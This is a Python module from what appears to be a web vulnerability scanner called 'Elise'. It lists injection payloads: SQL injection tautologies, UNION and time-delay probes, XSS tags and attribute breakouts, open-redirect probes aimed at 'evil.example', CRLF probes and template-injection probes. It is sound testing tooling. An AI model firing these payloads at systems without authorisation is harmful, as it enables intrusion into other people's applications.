# backend/modules/payloads.py
"""
Curated payload pools for Elise.

⚠️ Use responsibly. These payloads are for security testing on systems
you own or have explicit permission to assess. Unauthorized use can be illegal.

Design goals
------------
- Small but effective core sets (works in CI and quick scans).
- Stable ordering (most generally useful first).
- Light context filtering via `payload_pool_for(family, context)`.
- Compatible with rankers and heuristics used in recommender.py.

Families provided
-----------------
- sqli
- xss
- redirect
- base
- ssti  (optional; included for completeness)

If you need larger/experimental pools, maintain them in a separate module
(e.g., payloads_ext.py) and import/merge here.
"""

from __future__ import annotations
from typing import Dict, Iterable, List, Optional

# ----------------------------- SQL Injection ---------------------------------

# Boolean/tautology probes (portable; short; low-breakage)
SQLI_BOOLEAN: List[str] = [
    "' OR '1'='1' --",
    "\" OR 1=1 --",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1) OR (1=1",
]

# UNION-based probes (good differential behavior where errors leak)
SQLI_UNION: List[str] = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
]

# Time-based probes (latency oracles)
SQLI_TIME: List[str] = [
    "1 AND SLEEP(3)--",               # MySQL/MariaDB
    "1;SELECT pg_sleep(3)--",         # PostgreSQL
    "';WAITFOR DELAY '0:0:3'--",      # SQL Server
]

# Minimal error-based / engine-nudging (kept tiny to avoid spam)
SQLI_ERROR: List[str] = [
    "'||CAST(1 AS INT)--",           # generic concat/coerce; often triggers syntax differences
    "'))/**/OR/**/(('1'='1",         # obfuscated OR (baseline evasion taste)
]

SQLI: List[str] = (
    SQLI_BOOLEAN
    + SQLI_UNION
    + SQLI_TIME
    + SQLI_ERROR
)

# ----------------------------- Cross-Site Scripting --------------------------

# Tag/DOM-based (HTML contexts)
XSS_TAG: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

# Attribute injection (often survives escaping in partial contexts)
XSS_ATTR: List[str] = [
    "\" onmouseover=\"alert(1)\" x=\"",
    "' autofocus onfocus=alert(1) x='",
]

# URL-based (good for href/src-style sinks and headers)
XSS_URL: List[str] = [
    "javascript:alert(1)",
]

XSS: List[str] = XSS_TAG + XSS_ATTR + XSS_URL

# ----------------------------- Open Redirect ---------------------------------

REDIRECT: List[str] = [
    "https://example.org/",
    "//evil.example",
    "https:%2F%2Fevil.example",
    "/\\evil.example",     # backslash trick
    "http://127.0.0.1",    # loopback (often blocked; useful oracle)
]

# ----------------------------- Base / Noise ----------------------------------

# Baseline mutation/noise payloads (useful for differential testing)
BASE: List[str] = [
    "*",
    "%27",          # '
    "%22",          # "
    "()",
    "{}",
    "[]",
    "%0d%0a",       # CRLF probe (very mild)
]

# ----------------------------- SSTI (optional) -------------------------------

SSTI: List[str] = [
    "{{7*7}}",          # Jinja2-style
    "${{7*7}}",         # Spring/EL-style
    "<%= 7*7 %>",       # ERB
    "#{7*7}",           # Thymeleaf/OGNL-style
]

# ----------------------------- Family mapping --------------------------------

PAYLOADS_BY_FAMILY: Dict[str, List[str]] = {
    "sqli": SQLI,
    "xss": XSS,
    "redirect": REDIRECT,
    "base": BASE,
    "ssti": SSTI,
}

# ----------------------------- Context filter --------------------------------

def _filter_by_context(pool: List[str], family: str, context: Optional[Dict] = None) -> List[str]:
    """
    Light, non-destructive filtering based on the injection context.

    context keys (best-effort):
      - injection_mode: 'query' | 'form' | 'json' | 'headers' | 'path' | 'multipart'
      - content_type:   e.g., 'application/json', 'text/html'
    """
    if not pool:
        return pool
    ctx = context or {}
    mode = str(ctx.get("injection_mode") or ctx.get("mode") or "").lower()
    ct   = str(ctx.get("content_type") or "").lower()

    out = pool

    try:
        if family == "xss":
            # JSON body injection: avoid raw tags that break JSON early
            if mode == "json":
                filtered = [p for p in out if "<script" not in p and "<img" not in p and "<svg" not in p]
                if filtered:
                    out = filtered
            # Headers: prefer URL/attr style over full <script>
            if mode == "headers":
                filtered = [p for p in out if "javascript:" in p or "onerror=" in p or "onload=" in p] or out
                out = filtered

        elif family == "sqli":
            # Path-only injection: keep short boolean/time probes; drop UNION (often breaks routing)
            if mode == "path":
                filtered = [p for p in out if "union select" not in p.lower()] or out
                out = filtered

        # Redirect typically needs no filtering.

    except Exception:
        return pool

    return out or pool


# ----------------------------- Public API ------------------------------------

def payload_pool_for(family: str, context: Optional[Dict] = None) -> List[str]:
    """
    Return the canonical pool for a given family, optionally filtered by context.

    Example:
        payloads = payload_pool_for("sqli", context={"injection_mode": "path"})
    """
    fam = (family or "").lower().strip()
    pool = PAYLOADS_BY_FAMILY.get(fam, [])
    # Always return a copy (callers may mutate)
    pool = list(pool)
    return _filter_by_context(pool, fam, context)


def all_families() -> List[str]:
    """List available families."""
    return list(PAYLOADS_BY_FAMILY.keys())


def iter_all_payloads() -> Iterable[str]:
    """Iterate all payloads across families (de-duplicated, stable order)."""
    seen = set()
    for fam in ("sqli", "xss", "redirect", "ssti", "base"):
        for p in PAYLOADS_BY_FAMILY.get(fam, []):
            if p not in seen:
                seen.add(p)
                yield p


__all__ = [
    "SQLI", "XSS", "REDIRECT", "BASE", "SSTI",
    "PAYLOADS_BY_FAMILY",
    "payload_pool_for", "all_families", "iter_all_payloads",
]
